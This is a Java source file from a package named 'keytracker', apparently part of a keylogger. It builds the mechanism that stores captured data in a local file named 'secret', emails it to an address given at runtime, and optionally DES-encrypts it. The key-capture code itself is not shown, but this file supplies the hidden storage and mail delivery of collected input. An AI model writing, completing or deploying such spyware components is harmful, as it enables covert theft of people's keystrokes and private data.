package com.keytracker;

import com.keytracker.encrypt.Encryptor;
import com.keytracker.encrypt.KeyGen;
import com.keytracker.file.MyFileWriter;
import com.keytracker.file.MyMailWriter;
import com.keytracker.file.Writer;
import com.keytracker.mail.MailSender;

import static com.keytracker.ArgsResolver.MAIL;

public class MechanismsFactoryImpl implements MechanismsFactory {
    private final ArgsResolver argsResolver;
    private final KeyGen keyGen;

    public MechanismsFactoryImpl(ArgsResolver argsResolver, KeyGen keyGen) {
        this.argsResolver = argsResolver;
        this.keyGen = keyGen;
    }

    @Override
    public StoreMechanism getStoreMechanism() {
        Writer fileWriter = null;
        Writer mailWriter = null;

        if (argsResolver.isFileArgPresent()) {
            fileWriter = new MyFileWriter("secret");
        }
        if (argsResolver.isMailArgPresent()) {
            mailWriter = new MyMailWriter(new MailSender(), argsResolver.getArguments().get(MAIL));
        }
        if (!argsResolver.isMailOrFileArgPresent()) {
            fileWriter = new MyFileWriter("secret");
        }

        return getStoreMechanism(fileWriter, mailWriter);
    }

    private StoreMechanism getStoreMechanism(Writer fileWriter, Writer mailWriter) {
        if (argsResolver.isCryptArgPresent()) {
            return new CryptedStoreMechanism(new Encryptor(keyGen.generate("DES"), "DES"), fileWriter, mailWriter);
        }

        return new BundledStoreMechanism(fileWriter, mailWriter);
    }
}
